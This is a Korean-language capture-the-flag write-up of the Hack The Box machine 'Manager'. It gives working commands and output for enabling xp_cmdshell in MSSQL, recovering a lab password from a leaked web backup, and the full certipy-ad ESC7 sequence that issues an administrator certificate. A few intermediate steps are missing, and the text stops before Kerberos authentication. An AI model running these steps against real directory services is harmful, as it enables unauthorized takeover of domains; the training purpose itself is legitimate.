![Manager](/assets/htb-windows/manager/manager.png)

**Manager**는 Medium 난이도의 Windows 머신으로, 초기 침투는 `RID Cycling`을 통해 사용자 계정을 열거한 뒤, 패스워드 스프레이 공격을 수행하여 **MSSQL 서비스 접근 권한을 획득하는 방식**으로 이루어진다. 

이후 `xp_dirtree` 프로시저를 활용해 파일 시스템을 탐색하던 중 웹 루트 내에 존재하는 웹사이트 백업 파일을 발견하게 된다. 

해당 백업을 추출하면 재사용된 자격 증명을 확보할 수 있으며, 이를 통해 WinRM으로 서버에 접근하게 된다. 

마지막으로 **Active Directory Certificate Services(`AD CS`)**의 취약점 중 하나인 `ESC7`을 악용하여 권한 상승을 수행하고 최종적으로 관리자 권한을 획득하게 된다.

# Vulnerability Analysis

## User Enumeration via SMB (RID Cycling)

이처럼 내부에서는 `null` 세션이 허용되는 것을 확인할 수 있다:

```bash
$ nxc smb 10.129.25.136 -u '' -p ''     

SMB         10.129.25.136   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)                                                                                                                            
SMB         10.129.25.136   445    DC01             [+] manager.htb\:
```

하지만 null 세션으로는 SMB 공유 목록을 열거할 수 없었다.

초기 접근 권한이 없는 상황에서 사용자 계정 정보가 필요하다고 판단하였고, SMB가 열려 있는 점을 이용해 `RID Cycling` 을 시도하였다. 

이를 위해 [impacket](https://github.com/fortra/impacket/tree/master)의 `lookupsid` 도구를 사용하였다.

## MSSQL Access

앞서 확보한 자격 증명을 이용하여, Nmap 스캔에서 확인된 MSSQL(`1433`) 서비스에 접근을 시도하였다.  

Windows 환경이므로 Windows 인증 을 활용하여 impacket의 `mssqlclient` 로 접속을 시도하였다:

```text
SQL (MANAGER\Operator  guest@master)> enable_xp_cmdshell
```

### Web Backup File Discovery

앞서 확인한 `inetpub` 디렉토리를 대상으로 `xp_dirtree` 를 이용해 내부 구조를 확인하였다:

```text
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub

subdirectory   depth   file   
------------   -----   ----   
custerr            1      0   

history            1      0   

logs               1      0

``` 

`inetpub` 은 IIS 웹 서버의 기본 디렉토리이며, 그중 `wwwroot` 는 웹 루트 경로에 해당한다.

이에 따라 `wwwroot` 디렉토리를 추가로 탐색하였다:

```text
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file

index.html                            1      1   

js                                    1      0

website-backup-27-07-23-old.zip       1      1 
```

그 결과, 일반 웹 파일들과 함께 `website-backup-27-07-23-old.zip` 과 같은 웹사이트 백업 파일을 확인할 수 있었다.

## Web File Access

Nmap 스캔에서 확인된 웹 서비스에 접속하여 웹 페이지를 확인하였다:

![Manager](/assets/htb-windows/manager/website.png)

간단한 정적 페이지로 구성되어 있으며, 특별한 입력 폼이나 동적 기능은 확인되지 않았다.  

`xp_dirtree` 를 통해 확인한 `wwwroot` 경로 내 `website-backup-27-07-23-old.zip` 파일은 웹 루트에 위치하고 있으므로, 브라우저를 통해 직접 접근이 가능하다.

실제로 해당 파일 경로를 URL로 요청하면 다음과 같이 ZIP 파일을 다운로드할 수 있다:

## Credential Extraction and Initial Access

다운로드한 ZIP 파일을 `unzip` 을 통해 압축 해제하였다:

```bash
$ unzip website-backup-27-07-23-old.zip

  inflating: .old-conf.xml           
  inflating: about.html              
  inflating: contact.html            
  inflating: css/bootstrap.css       
  inflating: css/responsive.css      
  inflating: css/style.css           
  inflating: css/style.css.map       
  inflating: css/style.scss          
  inflating: images/about-img.png    
  inflating: images/body_bg.jpg

  inflating: images/client.jpg       
  inflating: images/contact-img.jpg

  inflating: images/hero-bg.jpg

```

압축을 해제한 결과, 여러 웹 리소스 파일들과 함께 `.old-conf.xml` 파일이 포함되어 있는 것을 확인할 수 있었다.

해당 파일을 확인해보면 다음과 같이 LDAP 설정 정보와 함께 사용자 자격 증명이 포함되어 있었다:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

이를 통해 `raven` 사용자의 자격 증명을 획득할 수 있었다:

```text
user: raven
password: R4v3nBe5tD3veloP3r!123
```

또한 `User Enrollable Principals` 와 `User ACL Principals` 에 `raven` 사용자가 포함되어 있어, 해당 계정이 실제로 인증서 요청 및 `CA` 설정 변경과 관련된 권한을 직접 행사할 수 있음을 의미한다.

따라서 이러한 권한 조합을 통해 **ESC7 취약점을 이용한 권한 상승**이 가능하다.

## ESC7 Exploitation

먼저 `raven` 사용자가 보유한 `ManageCa` 권한을 이용하여, 인증 기관(`CA`)에 대해 추가적인 권한을 부여할 수 있다.

이를 통해 자신을 `CA` 의 `Officer` 로 등록하였다:

```bash
$ certipy-ad ca -ca manager-DC01-CA -dc-ip 10.129.25.136 -u raven -p 'R4v3nBe5tD3veloP3r!123' -add-officer raven -target dc01.manager.htb

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

`Officer` 권한을 획득하면 인증서 요청을 승인할 수 있는 권한이 생긴다.

이후 `SubCA` 템플릿을 이용하여 `administrator` 계정으로 인증서 발급을 요청하였다:

```bash
$ certipy-ad req -ca manager-DC01-CA -dc-ip 10.129.25.136 -u raven -p 'R4v3nBe5tD3veloP3r!123' -template SubCA -target dc01.manager.htb -upn administrator@manager.htb

[*] Requesting certificate via RPC
[*] Request ID is 20
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '20.key'
[*] Wrote private key to '20.key'
[-] Failed to request certificate
```

`raven` 계정에는 해당 템플릿에 대한 직접적인 발급(`Enroll`) 권한이 없기 때문에, 인증서 요청은 시스템 상에서 거부(`CERTSRV_E_TEMPLATE_DENIED`)된다. 

그러나 이 요청은 폐기되지 않고 CA 데이터베이스에 기록되며, `Request ID 20` 과 함께 개인 키가 생성된다.

이때 앞서 획득한 `Officer` 권한을 이용하여 해당 요청을 직접 승인할 수 있다:

```bash
$ certipy-ad ca -ca manager-DC01-CA -dc-ip 10.129.25.136 -u raven -p 'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -issue-request 20

[*] Successfully issued certificate request ID 20
```

이로써 **Request ID 20번 인증서 요청이 승인**되었으며, 이후 해당 요청을 기반으로 `administrator` UPN이 포함된 인증서를 획득할 수 있게 되었다.

이후 승인된 요청을 기반으로 인증서를 획득할 수 있다:

```bash
$ certipy-ad req -ca manager-DC01-CA -dc-ip 10.129.25.136 -u raven -p 'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -retrieve 20

[*] Retrieving certificate with ID 20
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '20.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Kerberos 인증 과정에서 `TGT` 발급이 정상적으로 이루어지도록 하기 위해, 공격자 시스템과 대상 시스템의 시간을 동기화하였다:

